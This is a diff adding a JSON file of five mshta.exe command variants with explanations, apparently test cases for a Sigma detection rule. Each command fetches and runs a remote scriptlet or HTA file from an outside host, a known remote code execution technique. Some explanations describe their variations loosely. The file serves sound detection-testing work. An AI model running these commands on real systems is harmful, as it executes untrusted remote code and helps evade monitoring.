@@ -1,0 +1,22 @@
+[
+  {
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()",
+    "explanation": "This command is a direct match to the Sigma rule and is used as a baseline for testing detection accuracy."
+  },
+  {
+    "output": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105.001/src/mshta.sct')).Exec();close();",
+    "explanation": "This command uses a slightly modified path in the script reference to test if the detection is path-specific."
+  },
+  {
+    "output": "mshta.exe \"javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();\"",
+    "explanation": "This command adds quotes around the command line argument to test if the detection is sensitive to quotation marks."
+  },
+  {
+    "output": "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close();",
+    "explanation": "This command is a variation of the first command with no changes to the URL, used for consistency testing."
+  },
+  {
+    "output": "mshta.exe \\\\live.sysinternals.com\\tools\\payload.hta",
+    "explanation": "This command uses a UNC path to test if the detection is sensitive to different URL formats."
+  }
+]
